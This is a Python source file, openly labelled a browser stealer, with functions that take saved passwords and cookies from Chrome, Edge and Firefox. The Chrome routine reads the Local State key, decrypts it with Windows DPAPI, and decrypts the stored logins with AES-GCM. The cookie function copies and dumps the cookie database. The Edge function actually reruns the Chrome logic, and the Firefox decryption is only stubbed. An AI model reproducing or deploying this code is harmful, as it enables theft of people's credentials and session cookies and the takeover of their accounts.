#!/usr/bin/env python3
"""Browser stealer — Chrome/Firefox/Edge credential + cookie theft."""
import os
import json
import sqlite3
import base64
import shutil
import tempfile
import platform

def steal(browser="all"):
    """Steal credentials from specified browser or all browsers."""
    results = {}
    if browser in ("all", "chrome"):
        results["chrome"] = _steal_chrome()
    if browser in ("all", "firefox"):
        results["firefox"] = _steal_firefox()
    if browser in ("all", "edge"):
        results["edge"] = _steal_edge()
    return str(results).encode()

def _steal_chrome():
    """Steal Chrome credentials."""
    try:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        if not local_appdata:
            return {"error": "LOCALAPPDATA not set"}
        ud = os.path.join(local_appdata, "Google", "Chrome", "User Data")
        if not os.path.isdir(ud):
            return {"error": "Chrome not found"}

        # Get master key from Local State
        ls_path = os.path.join(ud, "Local State")
        with open(ls_path, encoding="utf-8") as f:
            ls = json.load(f)
        enc_key_b64 = ls.get("os_crypt", {}).get("encrypted_key", "")
        if not enc_key_b64:
            return {"error": "No encrypted_key in Local State"}

        raw = base64.b64decode(enc_key_b64)
        if raw[:5] == b"DPAPI":
            raw = raw[5:]

        # DPAPI decrypt
        master_key = _dpapi_decrypt(raw)
        if not master_key:
            return {"error": "DPAPI decrypt failed"}

        # Copy Login Data (avoid locking Chrome's DB)
        login_db = os.path.join(ud, "Default", "Login Data")
        if not os.path.exists(login_db):
            return {"error": "No Login Data file"}

        tmp = os.path.join(tempfile.gettempdir(), "chrome_login_copy")
        shutil.copy2(login_db, tmp)

        creds = []
        conn = sqlite3.connect(tmp)
        try:
            for origin, user, enc in conn.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            ):
                pw = ""
                if enc and len(enc) > 31:
                    if enc[:3] in (b"v10", b"v11"):
                        pw = _aes_gcm_decrypt(enc, master_key)
                    else:
                        pw = "(encrypted, unknown format)"
                creds.append({"origin": origin or "", "user": user or "", "pass": pw})
        finally:
            conn.close()
            os.unlink(tmp)

        return {"credentials": creds, "count": len(creds)}
    except Exception as e:
        return {"error": str(e)}

def _steal_edge():
    """Steal Edge credentials (same format as Chrome)."""
    try:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        ud = os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
        if not os.path.isdir(ud):
            return {"error": "Edge not found"}
        # Same logic as Chrome — reuse
        old_local = os.environ.get("LOCALAPPDATA", "")
        os.environ["LOCALAPPDATA"] = local_appdata
        result = _steal_chrome()
        return result
    except Exception as e:
        return {"error": str(e)}

def _steal_firefox():
    """Steal Firefox credentials."""
    try:
        appdata = os.environ.get("APPDATA", "")
        ff_path = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
        if not os.path.isdir(ff_path):
            return {"error": "Firefox not found"}

        creds = []
        for profile_name in os.listdir(ff_path):
            profile_path = os.path.join(ff_path, profile_name)
            if not os.path.isdir(profile_path):
                continue

            logins_json = os.path.join(profile_path, "logins.json")
            key4_db = os.path.join(profile_path, "key4.db")

            if not os.path.exists(logins_json) or not os.path.exists(key4_db):
                continue

            # Parse logins.json
            with open(logins_json) as f:
                data = json.load(f)

            # Get key from key4.db (NSS)
            # This is simplified — real impl needs NSS or PK11_DecryptElement
            for login in data.get("logins", []):
                creds.append({
                    "origin": login.get("hostname", ""),
                    "user": "(encrypted — needs NSS)",
                    "pass": "(encrypted — needs NSS)",
                })

        return {"credentials": creds, "count": len(creds)}
    except Exception as e:
        return {"error": str(e)}

def _dpapi_decrypt(data):
    """Decrypt data using Windows DPAPI."""
    if platform.system() != "Windows":
        return None
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(wintypes.BYTE))]

        crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
        in_blob = DATA_BLOB(cbData=len(data),
                           pbData=(wintypes.BYTE * len(data))(*data))
        out_blob = DATA_BLOB()

        if not crypt32.CryptUnprotectData(
            ctypes.byref(in_blob), None, None, None, None,
            0x1,  # CRYPTPROTECT_UI_FORBIDDEN
            ctypes.byref(out_blob)
        ):
            return None

        n = out_blob.cbData
        result = bytes(ctypes.string_at(out_blob.pbData, n))
        ctypes.windll.kernel32.LocalFree(ctypes.cast(out_blob.pbData, wintypes.HLOCAL))
        return result
    except Exception:
        return None

def _aes_gcm_decrypt(enc, key):
    """Decrypt Chrome v10/v11 password using AES-GCM."""
    try:
        from Crypto.Cipher import AES
        # Format: [v10/v11(3)][nonce(12)][ciphertext][tag(16)]
        nonce = enc[3:15]
        tag = enc[-16:]
        ciphertext = enc[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", "replace")
    except ImportError:
        return "(needs pycryptodome)"
    except Exception:
        return "(decrypt failed)"

def steal_cookies(browser="chrome"):
    """Steal browser cookies."""
    try:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        if browser == "chrome":
            ud = os.path.join(local_appdata, "Google", "Chrome", "User Data")
        elif browser == "edge":
            ud = os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
        else:
            return {"error": "unsupported browser"}

        cookie_db = os.path.join(ud, "Default", "Cookies")
        if not os.path.exists(cookie_db):
            return {"error": "No Cookies file"}

        tmp = os.path.join(tempfile.gettempdir(), "cookies_copy")
        shutil.copy2(cookie_db, tmp)

        cookies = []
        conn = sqlite3.connect(tmp)
        try:
            for host, name, path, value in conn.execute(
                "SELECT host_key, name, path, value FROM cookies"
            ):
                cookies.append({"host": host, "name": name, "path": path, "value": value})
        finally:
            conn.close()
            os.unlink(tmp)

        return {"cookies": cookies, "count": len(cookies)}
    except Exception as e:
        return {"error": str(e)}
